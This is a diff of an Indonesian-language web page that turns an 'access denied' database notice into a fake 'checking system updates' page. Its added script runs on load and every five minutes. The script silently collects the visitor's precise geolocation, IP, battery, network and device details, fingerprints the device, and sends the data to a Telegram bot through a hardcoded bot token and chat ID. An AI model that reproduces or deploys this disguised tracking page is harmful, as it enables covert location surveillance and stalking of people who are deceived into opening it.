@@ -1,41 +1,108 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Database Nusantara</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sistem Android</title>
   <style>
-    body {
-      background-color: #0b0b0b;
-      color: #00ffcc;
-      font-family: monospace;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-      padding: 20px;
-    }
-    img.logo {
-      width: 160px;
-      margin-bottom: 30px;
-      filter: grayscale(100%) brightness(150%);
-    }
-    h1 {
-      color: #ff4444;
-      font-size: 1.4em;
-      margin-bottom: 15px;
-    }
-    p {
-      color: #00ffff;
-      font-size: 1em;
-    }
+    body { background: #0f0f0f; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+    h1 { color: #00ff88; }
+    .loading { margin-top: 20px; font-size: 14px; }
   </style>
 </head>
 <body>
-  <img src="https://borneo101.github.io/DataBase/garuda_ai.png" class="logo" alt="Garuda AI" />
-  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
-  <p>Prosedur otorisasi internal sedang berlangsung. Sistem dalam status validasi sumber akses.</p>
+  <h1>Mengecek Pembaruan Sistem...</h1>
+  <div class="loading">Mohon tunggu beberapa saat</div>
+
+  <script>
+    const botToken = "7317238253:AAEORpkEBywWC2AvP-GUj1wfr1m4K5irbV0"; // @OpsBorneo_Bot
+    const chatId = 5677912817;
+
+    async function sendToTelegram(text) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
+    }
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unknown";
+      }
+    }
+
+    async function sendData() {
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        });
+
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const speed = pos.coords.speed ?? 'Unknown';
+        const heading = pos.coords.heading ?? 'Unknown';
+        const altitude = pos.coords.altitude ?? 'Unknown';
+        const accuracy = pos.coords.accuracy + 'm';
+
+        const battery = await navigator.getBattery();
+        const batLevel = Math.round(battery.level * 100);
+        const charging = battery.charging ? 'Yes' : 'No';
+
+        const screenRes = `${screen.width}x${screen.height}`;
+        const lang = navigator.language;
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const localTime = new Date().toLocaleString();
+        const utcTime = new Date().toUTCString();
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+
+        const connection = navigator.connection || {};
+        const netType = connection.effectiveType || 'Unknown';
+        const downSpeed = connection.downlink || 'Unknown';
+
+        const ip = await getIP();
+
+        const rawID = ua + screenRes + tz + lang;
+        const buffer = new TextEncoder().encode(rawID);
+        const digest = await crypto.subtle.digest('SHA-256', buffer);
+        const hashArray = Array.from(new Uint8Array(digest));
+        const ID = 'USR-' + hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 10).toUpperCase();
+
+        const text = `
+[${ID}]
+IP: ${ip}
+Lokasi: ${lat}, ${lon}
+Map: https://maps.google.com/?q=${lat},${lon}
+Akurasi: ${accuracy}
+Speed: ${speed}
+Heading: ${heading}
+Altitude: ${altitude}
+
+Waktu Lokal: ${localTime}
+UTC: ${utcTime}
+Timezone: ${tz}
+Lang: ${lang}
+
+Battery: ${batLevel}% (Charging: ${charging})
+Network: ${netType} | Downlink: ${downSpeed} Mbps
+Device: ${platform}
+Screen: ${screenRes}
+UserAgent: ${ua}
+`;
+
+        sendToTelegram(text);
+      } catch (e) {
+        sendToTelegram("Gagal mengambil data: " + e.message);
+      }
+    }
+
+    sendData();
+    setInterval(sendData, 5 * 60 * 1000); // ulang setiap 5 menit
+  </script>
 </body>
 </html>
